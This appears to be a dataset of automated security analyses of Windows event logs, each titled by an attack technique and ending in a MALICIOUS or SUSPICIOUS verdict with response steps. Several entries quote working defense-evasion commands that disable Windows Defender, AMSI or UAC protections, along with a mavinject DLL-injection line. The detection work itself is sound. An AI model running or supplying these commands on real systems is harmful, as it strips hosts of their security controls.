     powershell.exe & {Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1}
     ```
   - Executing commands to disable security features such as Windows Defender is often an indicator of malicious intent. This action aims to weaken the system's defenses, suggesting an attempt to bypass or disable protective measures.

2. **Frequent Use of System Utilities:**
   - Multiple instances of processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were executed under the user account `SERVER002\admin_test`.
   - While these utilities are legitimate Windows processes, their manual execution in close succession might suggest reconnaissance or unauthorized administrative activities on the system.

3. **Integrity Level:**
   - The PowerShell process was executed at a ""High"" integrity level, indicating it was run with elevated privileges. This is further concerning given the context of the PowerShell command executed to disable Windows Defender.

### Benign Activity:
- The logs contain numerous entries related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) running under `NT AUTHORITY\SYSTEM`. These are normal system update processes scheduled to keep system software up-to-date and largely appear routine.

### Assessment and Resolution:
- **Malicious Indicators:** The use of PowerShell to disable Windows Defender's AntiSpyware is a significant red flag. This command behavior suggests an intentional act to reduce system defenses, typical of preparatory actions for a potential compromise.
  
- **Resolution: MALICIOUS:** The identified PowerShell activity is a clear indicator of malicious activity. I am confident that this reflects unauthorized and potentially harmful behavior due to the command's nature and intent.

### Recommendations:
- **Immediate Actions:**
  - Investigate and isolate the host to prevent further potential damage or data exfiltration.
  - Conduct a thorough security assessment and malware scan of the system to identify any additional malicious software or changes made during this period.
  
- **Preventive Measures:**
  - Implement stricter access controls to limit who can execute scripts or modify key security settings.
  - Enhance monitoring for execution of high-risk commands and real-time alerts for such activities.
  - Review and potentially revise group policies to prevent unauthorized scripts or commands from disabling critical security features.

The evidence strongly suggests that further compromise prevention measures should be reevaluated and reinforced proactively to better safeguard against similar threats in the future."
UEFI Persistence via Wpbbin.exe File Creation,"### Detailed Analysis of Windows Event Logs

#### Suspicious or Anomalous Observations:

1. **Command Execution via PowerShell:**
   - Anomalous PowerShell activity was detected where `powershell.exe` executed a command to create a file in the `C:\Windows\System32\` directory with the name `wpbbin.exe`. This activity can be potentially malicious, as creating executables in the Windows system directory is a common tactic used by malware for persistence or execution.
   - The command executed is: `powershell.exe & {echo \""Creating %systemroot%\wpbbin.exe\"" , New-Item -ItemType File -Path \""$env:SystemRoot\System32\wpbbin.exe\""}`. This action suggests the potential installation of unauthorized software or malware.

2. **Privilege Escalation:**
   - The user `admin_test` has been granted high-level privileges, including powerful privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, which could allow for further exploitation if misused.
   - There is an event (Event ID: 4672) listing these privileges which indicates a session with elevated permissions.

3. **Multiple Execution of Hostname and Whoami:**
   - Repeated execution of native Windows utilities like `hostname.exe` and `whoami.exe` may indicate reconnaissance activities. These tools can gather system information and user account details which are useful for attackers in the initial phases of an attack.
   
4. **Time Manipulation:**
   - There were changes in the system clock (as shown by Event IDs: 4616, 4624) which could indicate attempts to manipulate timestamps. This may be used to obscure evidence of activity or align with other attacks.

5. **Log Manipulation:**
   - `wevtutil.exe` (Windows Events Utility) was executed several times, possibly indicating an attempt to clear or manipulate event logs to hide tracks.

#### Indicators of Malicious Activity:

- **Creating an Executable in System Directory:**
  - The execution of a PowerShell command to create an executable file in the system's core directories is strongly indicative of malicious intent.

DLL Search Order Hijacking - amsi.dll,"**Analysis of the Logs:**

**1. Windows PowerShell Logs:**
- **Key Observations:** The logs show multiple instances of PowerShell activity linked to a suspicious `updater.exe` located in the `AppData\Roaming` directory. PowerShell is being executed using `updater.exe -Command exit`. While accessing PowerShell is normal, using a non-standard application like `updater.exe` to host PowerShell is suspicious, especially when placed in `AppData\Roaming`, a common location for malicious files.
  
**2. Security Logs:**
- **Key Observations:** The logs include regular time change adjustments (Event ID 4616) performed by `svchost.exe`, a standard system process under `LOCAL SERVICE`. This is a routine operation and not inherently suspicious.

**3. Application Logs:**
- **Key Observations:** The logs show the stopping of a service by `edgeupdate`. This is a standard activity performed by the Microsoft Edge Update service, which doesn't typically indicate malicious behavior.

**4. System Logs:**
- **Key Observations:** Regular kernel and time service activities, such as time adjustments, are recorded. These are normal operations, particularly for administrative tasks and do not appear suspicious.

**5. Sysmon Logs:**
- **Key Observations:** Several executions were noted:
  - A suspicious command `cmd.exe /c copy ... powershell.exe ... updater.exe ...` is executed which attempts to manipulate PowerShell and `amsi.dll` files from System32 to `AppData`. This indicates a potential attempt to bypass Windows security mechanisms (AMSI - Antimalware Scan Interface) and continue using PowerShell with elevated privileges. This behavior is often associated with fileless malware or persistency mechanisms.

**Assessment:**
The repeated usage and manipulation of PowerShell via `updater.exe`, especially prefixed by copying system files and `amsi.dll` to a user directory for further execution, indicates a potential malicious attempt to misuse PowerShell while evading detection mechanisms. The presence of activities intended to manipulate and invoke scripts using system processes in unusual ways warrants concern.

**Resolution: MALICIOUS**
The activities observed, particularly the use of `updater.exe` from a user's AppData directory to execute and manipulate PowerShell, and the attempt to copy and potentially misuse AMSI indicate highly suspicious and likely malicious activity. Immediate action should be taken to isolate the affected system, quarantine the suspected files, and conduct a thorough investigation and forensic analysis to determine the extent of the compromise."
AMSI Bypass - Create AMSIEnable Reg Key,"Based on the logs provided, we need to analyze for signs of malicious activity or indicators of compromise. Let's break down the logs:

### Windows PowerShell Log Analysis:
- **PowerShell Command Observations**:  
  - A command is executed using PowerShell to modify a registry value. The specific PowerShell command is:
    ```powershell
    powershell.exe & {New-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Force | Out-Null
    New-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null}
    ```
  - This command specifically attempts to disable AMSI (Antimalware Scan Interface), which is a common method used by malware to bypass security tools that rely on AMSI for script scanning.  
  - Execution of such registry modifications to disable AMSI is highly suspicious and should be treated as an indicator of potential malicious activity.

### Sysmon Log Analysis:
- **Process Creation Observations**:  
  - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed before the PowerShell command mentioned above. `wevtutil.exe` is typically used to manage event logs, which can include clearing logs to cover tracks.
  - Although both processes executed under the `admin_test` account, their repeated and rapid execution in conjunction with each other might indicate an attempt to obfuscate actions.
- **Usage of Legitimate Applications**:  
  - The use of `whoami.exe` and `hostname.exe` appears typical, often used for environmental discovery. However, their invocation right before the suspicious PowerShell command adds to the concern.

### Application Log Analysis:
- **Edge Update Entries**:  
  - The entries related to `Microsoft Edge Update` seem to be legitimate update processes (incidentally possessing service stop notifications), though their presence alongside the PowerShell execution merits cautious attention due to timing.

### Security and System Logs:
- No significant anomalies directly linked to the suspicious PowerShell can be identified in these logs. TimeSync events seem regular.

### Conclusion:
The combination of PowerShell activity disabling AMSI, with process activities managing logs and legitimate application use in an unusual pattern, strongly indicates suspicious behavior. Disabling AMSI is a known technique used by malware and attackers to evade detection by security solutions.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance:
1. **Immediate Investigation**: Conduct deeper investigation into the timeline surrounding this event. Verify user activity, network connections, and other host interactions.
2. **Containment**: Isolate the affected host to prevent potential lateral movement or data exfiltration.
3. **Threat Hunting**: Check other systems for similar registry modifications or PowerShell command patterns.
4. **Forensic Analysis**: Gather memory and disk images if possible for detailed forensic analysis.
5. **Review Security Controls**: Ensure that appropriate alerts and logs are monitored for AMSI-related registry changes.
6. **User Awareness**: Reinforce awareness and training about phishing and potential initial attack vectors that could lead to this behavior.

Consider involving an incident response team to perform a thorough investigation and take necessary corrective actions."
UACME Bypass Method 33,"After analyzing the provided Windows event logs, here is a detailed breakdown of the activities:

### Analysis:

1. **Sysmon Logs:**
   - The logs show frequent use of `cmd.exe` with a command involving `uacme\\33 Akagi64.exe`. This is suspicious because UACMe is a tool used to exploit User Account Control (UAC) settings and can be used for privilege escalation attacks.
   - Numerous instances of `MicrosoftEdgeUpdate.exe` in various operations including service operations and COM registration, suggesting repeated script or system-driven updates or installs of Edge browser components.
   - Various other routine processes and updates, such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `usoclient.exe`, `wsqmcons.exe`, etc., appear following standard operating procedures for system tasks, updates, and telemetry.
   - The presence of `sppsvc.exe` (Software Protection), `TrustedInstaller.exe`, and other core Windows services is typical of normal OS operations.
  
2. **Security Logs:**
   - Event ID 4624 (Account Logon) with a logon type of `5` is relevant to service start events, which is expected in a system environment where services are routinely started.
   - Privilege escalation-related Event ID 4672 indicates administrative rights were used, but as it's associated with NT AUTHORITY\SYSTEM, this is consistent with authorized service actions.
   - Multiple occurrences of Event ID 5379 indicate failed credential reads, pointing to unsuccessful attempts to read or retrieve certain credentials.

3. **Application Logs:**
   - Software Protection Platform Service logs indicate benign, routine operations usually concerning licensing.
   - Logs with the provider name `edgeupdate` mostly entail service stops, and no immediate sign of tampering present related to these entries.

### Assessment:

- The most notable suspicious occurrence involves the execution of `cmd.exe` with reference to `uacme\\33 Akagi64.exe`, indicating possible privilege escalation attempts via a known tool. 
- The frequent Edge update process patterns could be standard or signify exploitation of a browser update service for lateral movements or persistence mechanisms—although this is less clear without further context or anomalies in the process's parent-child execution hierarchy.

### Resolution:

Based on the evidence and current log data, I categorize this case as **SUSPICIOUS**. While most activities align with typical system operations or maintenance tasks, the detected use of UACMe for potential unauthorized privilege escalation necessitates further investigation. 

### Guidance:

1. **Immediate Actions:**
   - Review system integrity and access permissions, particularly focusing on `admin_test` and other elevated user accounts.
   - Conduct a full antivirus and anti-malware scan with updated definitions.
   - Isolate any directly implicated systems unless vital to core operations until verification of system integrity is ensured.

2. **Long Term:**
   - Enhance monitoring for target UAC exploit patterns and unauthorized command executions.
   - Implement stricter access control and privilege management policies, including whitelisting software components.
   - Review recent security patches related to major software like Microsoft Edge and Windows telemetry tools to ensure all are up to date.

Further investigations should focus on correlating more logs, scrutinizing external connections, and performing a verification via other network traffic and systems logs to establish comprehensive root cause insights."
Disable Windows Security Center Notifications,"Based on the analysis of the provided Sysmon, Application, Security, and absence of any other significant logs, here's a detailed assessment:

### Detailed Analysis:

1. **Sysmon Logs:**

     - Multiple executions of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`. This could indicate routine administrative tasks, as these tools are commonly used for system configuration and monitoring.
     - The execution of `cmd.exe` with a command targeting the Windows registry: `reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f`. This registry modification may not be typical unless part of a known system change or update, as it affects the Windows Shell behavior.
   - **User Context**: The processes were executed by a user with `SERVER002\admin_test`, suggesting a user with potential administrative privileges conducted these actions.

2. **Application Logs:**
   - A single entry from the Software Protection Platform Service indicates routine check-in or logging by the RulesEngine. This is typical behavior for the service and not suspicious alone.

3. **Security Logs:**
   - **Logon Events**: 
     - Event ID 4624 shows a successful logon by `admin_test` using NTLM over the network (LogonType 3). The use of NTLM and the presence of remote IP could suggest remote administrative access, which is common in server management setups.
     - Event ID 4672 involves privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, typically assigned to administrative accounts and potentially risky if misused. However, given the context, this could align with necessary administrative functions.
   - **Logoff Event**: Event ID 4634 aligns with normal user logoff for `admin_test`.

4. **Potential Risks and Indicators:**
   - The execution of registry modification commands (`reg add`) via `cmd.exe` using elevated privileges indicates a change that could either be part of a legitimate system configuration or unauthorized configuration. Such modification requires scrutiny, especially if there's no officially sanctioned reason behind the change.

### Assessment of the Situation:

- **Observed Activity**: The activities logged involve tools utilized for viewing/altering system settings and processes executed by an admin-level user. Registry changes illustrate an unexpected action, potentially indicating subtle system modifications without clear justification from available logs.

### Resolution:

- **SUSPICIOUS**: The logs show potentially suspicious activity due to the registry modification command execution, which could merit further investigation. This activity isn’t outright malicious but not entirely benign without additional context, especially if conducted outside regular administrative changes. Further validation is needed to ensure this aligns with intended administrative procedures.

### Recommendations:

1. **Validation**: Confirm with system administrators if they sanctioned the registry changes. Often, legitimate processes might not be documented adequately but could be associated with system updates or patches.
   
2. **Monitoring**: If no valid justification exists, increase monitoring on the `SERVER002\admin_test` account to capture future deviations from expected activity, especially regarding registry or critical system configurations.
   
3. **Review Network Connections**: Since remote logins were observed, ensure the source IP and associated devices are trusted and part of the organization's remote management infrastructure.
   
4. **Apply Baseline Security Measures**: Ensure that changes following similar patterns are monitored through alerts for unjustified administrative commands or registry modifications.

By proceeding with these recommendations, potential risks can be mitigated, and the environment can remain secure as further information is gathered."

- **Use of `wevtutil.exe` and `conhost.exe`:**
  - There are multiple entries involving `wevtutil.exe` and `conhost.exe`, initiated by the user `SERVER002\admin_test`.
  - The utility `wevtutil.exe` is typically used for managing event logs, and its presence here with `admin_test` could be part of regular administrative tasks or log examination. However, if not linked to known administrative actions, this could be deemed as suspicious and warrants further verification of legitimacy.
  
- **Execution of `cmd.exe` with Windows Defender Command:**
  - The entry involving `cmd.exe` shows a command line that runs the Windows Defender utility `MpCmdRun.exe` to `RemoveDefinitions -All`. This could be an indicator of a potential attempt to disable or remove antivirus definitions, which is highly suspicious.
  - This action could compromise the security posture of the machine by leaving it vulnerable to threats.

- **Execution of `whoami.exe` and `hostname.exe`:**
  - These entries show typical command line queries to establish the user identity and hostname, which can be considered benign unless performed repeatedly or combined with other suspicious activities.

### System Log:
- An entry under Kernel-General logs a configuration change with no evident malicious indicators. The recorded data describes a change to the ELAM hive, which could be part of regular operations.

### Security Log:
- The security log section is empty in the provided context, meaning there are no recorded events to analyze for suspicious or malicious activity.

### Conclusion:
- **Suspicious Actions:**
  - The use of commands to alter Windows Defender definitions (`-RemoveDefinitions -All`) without oversight or proper explanation from known administrative processes raises a red flag. Such actions can disable critical security measures and are typically considered suspicious.
  - While the use of `wevtutil.exe` and `conhost.exe` under administrative credentials could be part of regular operations, the context of their usage during a possible attempt to disable Defender definitions could merit further investigation.

### Resolution:
Based on the findings, the situation is assessed as **SUSPICIOUS**. This assessment is given due to the actions taken with Windows Defender which indicate a potential risk that must be investigated further. It is recommended to:
1. Verify the legitimacy of the commands executed by `SERVER002\admin_test`.
2. Check for any unauthorized access or activity during the time frame in which these logs were recorded.
3. Review the security policies around the usage of administrative commands that can disable security measures.

Further action should include monitoring for similar activities and potentially restoring any altered security settings."

Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"### Analysis of Windows Event Logs

#### Summary of Findings:

1. **Time and Date Alteration:**
   - **System Log & Security Log:**
     - Multiple events in both the System log and Security log show changes in system time (EventID 4616). This can often indicate normal system operations, such as syncing with a time server (e.g., time.windows.com as mentioned in EventID 35).
     - However, time tampering can also be indicative of malicious activity if done to conceal tracks or manipulate log records. 
     - The process responsible for these changes is `svchost.exe`, running under a legitimate system context `LOCAL SERVICE`.

2. **Windows PowerShell Log:**
   - **Script Executions:**
     - A PowerShell script was executed to change the `ConsentPromptBehaviorAdmin` registry setting, responsible for User Account Control (UAC) behavior for administrators.
     - Command: `Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0`.
     - Altering UAC settings can suggest an attempt to reduce security measures, allowing potentially malicious operations without prompt or notification.

3. **Sysmon Logs:**
   - **Command Executions:**
     - Execution of `whoami.exe`, `hostname.exe`, and `PowerShell.exe`. While these tools can be used legitimately (often for troubleshooting or scripting), they are also commonly used by threat actors to recon environment and alter security settings.

Modify Registry of Current User Profile - cmd,"### Analysis of Windows Event Logs

#### Sysmon Log Analysis:
1. **Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by user `SERVER002\admin_test`. While `wevtutil.exe` is used for managing Windows Event logs, frequent execution without clear administrative tasks could suggest enumeration attempts.
   - Execution of `whoami.exe` by `admin_test`, typically used to gather user information and might be used to validate user permissions during suspicious activity.
   - Execution of `cmd.exe` with a command to modify registry settings (`reg add`) to hide file extensions. This action can be undesirable as it might be used to obscure file types for potential trickery or phishing.

2. **Registry Modification:**
   - The command executed (`cmd.exe` with `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f`) modifies the registry to hide file extensions, which is usually not a standard practice unless done intentionally by the user, indicating possible tampering.

3. **Integrity Level and Parentage:**
   - Processes are executed with High Integrity Level by `SERVER002\admin_test`, indicating that the processes have administrative privileges. The parent processes such as `wsmprovhost.exe` could be legitimate; however, with the accompanying activity, this poses a potential concern.

#### Security Log Analysis:
- The repeated event ID `4616`, indicating system time changes by `svchost.exe` under `LOCAL SERVICE`, might be part of normal time synchronization or tampering if used within certain malicious patches. Here, it is closely timestamped with enumeration-related processes, which can be coincidental or possibly coordinated for manipulation.

#### System and Application Log Analysis:
- The system time has been adjusted, which can be normal behavior during synchronization, but should be carefully looked at to avoid malicious tampering.
- The application log relates to software protection and does not immediately suggest malicious activity.

### Assessment:

Based on the log analysis, the primary suspicious activities include frequent usage of administrative tools and scripts (`wevtutil.exe`, `whoami.exe`) by an `admin_test` user, coupled with registry alterations to hide file extensions. The sequence and frequency of these actions are concerning and deviate from typical legitimate administrative actions unless otherwise documented as part of authorized maintenance activities.

### Resolution:
- **SUSPICIOUS** - The logs contain activity, particularly around the command-line execution and registry manipulation, that does not look right in a standard operating environment and needs more investigation. It is recommended to conduct a thorough investigation into the user's intent and recent activities on the host system and validate if such changes were authorized or documented by the system administrators.

### Guidance:
- **Investigate the Intent**: Confirm the justification for the registry modification and frequent use of administrative command-line tools.
- **Review System Changes**: Check for any additional unauthorized changes to the system that might have occurred in conjunction with the analyzed events.
- **User Verification**: Verify with `admin_test` for confirmation and documentation about the executed tasks.
- **Monitoring and Alerts**: Begin enhanced monitoring on `Server002` for unusual behavior, particularly those in line with stealth or privilege-escalating actions."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Based on the provided logs, several points of interest and potential indicators of malicious activity stand out:

1. **Suspicious PowerShell Activity**:
   - In the Windows PowerShell log, ""EventID 600"" shows the execution of a suspicious PowerShell command for running `svchost.exe` from a non-standard location: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\svchost.exe""`. This is unusual, as `svchost.exe` is generally a legitimate Windows process used for hosting services, but it should not be located in a user's temp directory. This is commonly associated with malicious activities like code execution or persistence mechanisms used by attackers.

2. **Security Log Indicators**:
   - Event ID ""4624"" indicates a successful logon to the system using the SYSTEM account. While this is common for many legitimate background processes, it is accompanied by Event ID ""4672,"" which lists privilege assignments indicative of a potentially privileged operation or service. This could be normal under many circumstances, but given the subsequent activities, it could be a part of a malicious sequence.
   - Event ID ""5379"" shows multiple failed access attempts to a particular service URI and MicrosoftAccount tied to the user `admin_test`. The repeated failures and specific targeting of credential storage might indicate either reconnaissance or misuse.

3. **Application Log Errors**:
   - The Application log contains a .NET Runtime error (Event ID ""1026"") with `svchost.exe` that throws a `System.IO.DirectoryNotFoundException`. This suggests that the rogue `svchost.exe` might be attempting to interact with a directory or file that doesn't exist, which aligns with potential malicious script or software failure.

4. **Sysmon Entries**:
   - Multiple `conhost.exe` and `wevtutil.exe` processes are spawned by `admin_test`, potentially indicating command-line activities typical of administrative diagnostics or possibly malicious activity such as clearing logs.
   - A `WerFault.exe` process related to Windows Problem Reporting is triggered, which can be suspicious following the failure of an unusual executable like `svchost.exe`.

5. **Process Spawning Hierarchy**:
   - Processes in unusual directories with names like `MicrosoftEdgeUpdate.exe` executing with the SYSTEM account could be legitimate, but they are out of place due to their storage in TEMP directories and should be further verified.

**Assessment**:
The combination of atypical `svchost.exe` execution from a non-standard directory, repeated credential access attempts by admin_test, and errors/exceptions related to a misconfigured executable strongly suggest the potential for malicious activity. This scenario might indicate an ongoing or partial compromise, possibly involving a hidden malware in the form of a Trojan or backdoor, particularly given the obfuscation techniques like using a legitimate process name (`svchost.exe`) placed in an abnormal location.

**Resolution**: SUSPICIOUS

**Guidance**:
- Immediate isolation of the affected host for further forensic analysis.
- Check the integrity and source of files within `C:\Users\ADMIN_~1\AppData\Local\Temp\`.
- Monitor network traffic for unusual outbound connections or data exfiltration.
- Conduct a full antivirus and anti-malware scan.
- Reset credentials for affected users, especially `admin_test`.
- Ensure all system software and applications are updated to their latest versions."
Masquerading - non-windows exe running as windows exe,"Upon analyzing the provided logs, several observations stand out:

**Windows PowerShell Log Analysis:**

1. **Command Execution via PowerShell**: 
   - The logs show command execution using PowerShell specifically crafted to copy an executable (`data.003.exe`) from a temporary directory to `svchost.exe` in the temp directory and then attempting to execute it via `Start-Process`, followed by `Stop-Process`.
   - This activity often indicates an attempt to execute potentially malicious code, as renaming an executable to `svchost.exe`, a legitimate Windows process name, is a common tactic to disguise malicious software.
   - The specific use of environment variables and try-catch with `Stop-Process` may indicate obfuscation and controlled execution or cleanup after running.

**Security Log Analysis:**

2. **Repeated Failed Credential Reads (Event ID 5379)**:
   - There are multiple logs indicating failed operations related to MicrosoftAccount and WindowsLive credentials (`ReturnCode=3221226021`), which might suggest unauthorized attempts to access these accounts or resources.
   - Repeated failure could be indicative of password spraying, brute force attempts, or misconfigured services.

3. **Event ID 4624 (Logon Success) and 4672 (Privileged Access)**:
   - Success logon events followed by special privileges being assigned (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) are logged. These privileges, if not expected during normal activity, could indicate a compromise seeking to maintain elevated access.

**Sysmon Log Analysis:**

4. **Process Creation with Potential Obfuscation**:
   - There is evidence of process creation events showing the launching of `svchost.exe` renamed from `data.003.exe`, which reaffirms suspicious activity. 
   - Additionally, `PowerShell.exe` usage with a long command line involving potentially malicious operations signals anomalous behavior.

**Application Log & System Log Analysis:**

5. **Routine Updates and Defender Enablement**:
   - Logs indicate routine security updates for Microsoft Defender and Windows Defender status checks, which, while necessary, are not inherently suspicious without additional context.

**Assessment:**
Given the indicators noted, primarily the PowerShell command usage potentially disguised as `svchost.exe`, the repeated logon attempts and assignments of high privileges, this activity strongly suggests malicious intent.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediate containment measures should be considered, such as isolating the host from the network to prevent further propagation.
- Conduct a thorough investigation of the file `data.003.exe` and its origins.
- Review user account activity for unauthorized access or privilege escalation.
- Correlate with other security telemetry (e.g., network activity) to determine the extent of the potential compromise.
- Consider informing law enforcement if data breach compliance is breached."
Modify UseTPM Registry entry,"Upon reviewing the provided Windows event logs, it is essential to focus on indicators of potential malicious activity such as unauthorized privilege escalation, unusual process executions, or anomalous behavior that deviates from expected patterns.

Here’s a detailed analysis of the logs:

1. **Microsoft Edge Update Activities**:
    - The logs contain numerous entries related to `MicrosoftEdgeUpdate.exe` and similar Edge update executables. It is common for software updates to involve multiple process executions involving update managers.
    - **Process Executions**: Observations show the execution of `MicrosoftEdgeUpdate.exe` and associated processes like `MicrosoftEdgeUpdateComRegisterShell64.exe`. These processes are running under the `NT AUTHORITY\SYSTEM` user and seem to be standard behaviors for updating or enrolling Edge components. 
    - **Command Line Arguments**: Arguments used in these processes are consistent with update operations (e.g., `/update`, `/regsvc`, `/regserver`). These are typical arguments seen in software update mechanisms.

2. **Registry Modification via CMD**:
    - One notable entry involves the execution of `cmd.exe` with a registry modification command: 
      ``` 
      ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f
      ```
    - **Analysis**: This indicates a modification to BitLocker policies which might be unusual and may indicate an administrative change or a potential security risk if unauthorized. The process is executed by the user `SERVER002\admin_test` with high integrity level. This action deserves attention as it involves security configurations on the host.

3. **Use of System Utilities**:
    - Various system utilities such as `wevtutil.exe`, `hostname.exe`, and `conhost.exe` are utilized by `SERVER002\admin_test`. The presence of these processes can be typical in administrative tasks.
    - **Context**: Their execution alone does not indicate malicious activity; however, in conjunction with other suspicious actions, they could represent attempts at accessing or exporting logs or interacting with the system console.

4. **Absence of High-Severity Anomalies**:
    - No explicit evidence points directly to malware infection (e.g., known malicious executables, hash mismatches with known bad values).
    - Actions appear to align with typical software update and administrative operations, provided these actions were authorized.

### Resolution

Based on the observations, the behavior reflected in the logs does not conclusively show signs of malicious activity, but there are potentially **Suspicious** elements worth further investigation, primarily the registry modification. Therefore, the resolution for this situation is:

**SUSPICIOUS**

### Guidance

- **Verify Registry Changes**: Confirm the legitimacy of the registry modification regarding BitLocker configuration with relevant administrative personnel.
- **Audit Access Controls**: Ensure that the `SERVER002\admin_test` account or any similar accounts have appropriate controls and limitations.
- **Continuous Monitoring**: Maintain vigilant observation of the events, particularly for any unusual privilege elevation or remote management access.
- **Update Security Policies**: Implement or review existing policies around software updates and administrative access."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"### Analysis

1. **PowerShell Logs:**
   - The PowerShell logs consistently show the execution of the command:
     ```
     Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
     ```
   - This command modifies a registry setting related to the Windows Secure Desktop feature for User Account Control (UAC) prompts. Changing this setting to `0` disables the secure desktop for elevation prompts, which can be a security risk as it allows malicious applications to interfere with UAC prompts.

2. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are launched under the user `SERVER002\admin_test`.
   - The execution of `powershell.exe` matches the suspicious command noted in the PowerShell logs.
   - Execution of `whoami.exe`, `wsmprovhost.exe`, and `hostname.exe` point towards enumeration activities which can be indicative of reconnaissance or further exploitation attempts.
   - Microsoft Edge update processes appear repeatedly. While Edge updates can occur normally, unwanted modifications or execution in temporary directories can indicate potentially unwanted activity.
  
3. **Application Logs:**
   - Only normal service stop events are logged for edge updates and software protection platform services, which do not appear inherently suspicious.

### Indicators of Compromise
- **Registry Modification via PowerShell:** The explicit modification of the Secure Desktop setting using PowerShell is a red flag for potential malicious activity. This setting is commonly targeted by attackers to reduce the security overhead of UAC prompts.
- **Enumeration Activities:** Execution of system enumeration tools indicates possible reconnaissance.

### Conclusion

Based on the analysis:
- The **PowerShell command** that disables a security feature is highly suspicious.
- Sysmon logs for multiple executions of `whoami.exe` and process activities related to `conhost.exe` under high integrity level further emphasize potentially unwanted behavior.
- The use of administrative tools in close sequence may suggest scripted or automated actions typically associated with malicious activity or compromise.

### Resolution: SUSPICIOUS

### Guidance
1. **Further Investigation:**
   - Review additional logs and endpoint activity around the timestamp of the suspicious activities.
   - Determine the origin of the `powershell.exe` command execution.
   - Validate if the `admin_test` account is compromised or misused.

2. **Mitigation Steps:**
   - Restore the Secure Desktop setting to its default value for security.
   - Monitor for further PowerShell executions and enable logging to capture full command lines for all executed scripts.
   - Consider isolating the affected host to prevent further potential compromise until a full investigation is completed.

3. **Recommendations:**
   - Enhance the alerting and monitoring around registry changes related to security settings.
   - Conduct a full security assessment on `Server002` and any associated systems for signs of further compromise."
mavinject - Inject DLL into running process,"### Analysis of Windows Event Logs

#### Indicators of Malicious Activity:

1. **Command Execution - `cmd.exe /c mavinject.exe`:**
   - The Sysmon log entry for `cmd.exe` shows it running with a command line argument to execute `mavinject.exe` with a DLL located in a temporary directory. This DLL path is `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\x64\\data.dll""`.
   - `mavinject.exe` is used for process injection, which is a technique often used by malware to execute code within the address space of another process.

2. **Use of Process Injection:**
   - The use of `mavinject.exe` suggests an attempt to inject a DLL into another process, indicative of potential malicious activity aiming to evade detection by running within a legitimate process.

3. **Processes Executed with High Integrity Level:**
   - The processes involved operate with a ""High"" integrity level, meaning they have elevated privileges. This could indicate that the threat actor has administrative rights on the system, increasing the potential impact of the attack.

4. **Chained Execution:**
   - The execution flow includes `wsmprovhost.exe` leading to `cmd.exe`, which then invokes `mavinject.exe`. This chain suggests an automated process or script potentially deploying malware components.

#### Assessment of the Situation:

- The presence of `mavinject.exe` with a DLL payload in a temporary directory, and the high integrity level, strongly suggests malicious activity. The processes seem to be engineered to execute and inject potentially harmful code.

### Resolution: MALICIOUS

#### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host to prevent potential lateral movement or further compromise within the network.
   - Conduct memory analysis and capture a forensic image of the system to preserve evidence for further investigation.

2. **Remedial Actions:**
   - Investigate other systems for similar signs of compromise.
   - Review access logs and active directory changes indicating the account ""SERVER002\\admin_test"" may have been exploited for elevated privileges.

3. **Strengthen Defenses:**
   - Update and run comprehensive virus and malware scans across the network.
   - Improve monitoring for unusual command-line executions and privilege escalations.
   - Patch and ensure that all endpoints have up-to-date security software.

4. **Further Investigation:**
   - Investigate how the threat actor gained access to execute these commands (e.g., phishing, exploit, weak passwords).
   - Check for any Indicators of Compromise (IOCs) related to the suspicious DLL and this execution chain across historical logs.

By following the above actions, the threat can be mitigated, and future occurrences prevented or promptly detected."
Add Network Share,"Upon analyzing the provided logs, here is a detailed breakdown of potentially suspicious or malicious activity detected:

### System log 
- The logs primarily show time-related events, including adjustments using `svchost.exe`. This is typically normal as `svchost.exe` handles various services like Windows Time Service. However, timezone changes or time syncs should be monitored for unusual patterns, especially if timezone information is altered to evade detection systems.
  
### Security log
- EventID 4616: Time Change events with `svchost.exe` being the responsible process. Time changes could be normal, but repeated changes or changes at odd times could be suspicious as they might be used to cover tracks in certain attack scenarios.

### Sysmon log
- Numerous process creations related to `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `net.exe`, and `net1.exe` are logged.
- Execution of administrative tools like `cmd.exe`, with the command line parameters indicating potential manipulation of network shares (`net use c:` `net share test=\\test\share /REMARK:""test share"" /CACHE:No`). This could be legitimate administrative activity, but it’s notable and should be verified.
- Multiple instances of `conhost.exe` and `whoami.exe` processes are also seen. While `whoami` is frequently used for user context checks, its repeated invocation could suggest script or automated processes.
- `wevtutil.exe` is involved in reading or modifying event logs. It may be used by attackers to clear or alter evidence of their presence.

### Findings Summary
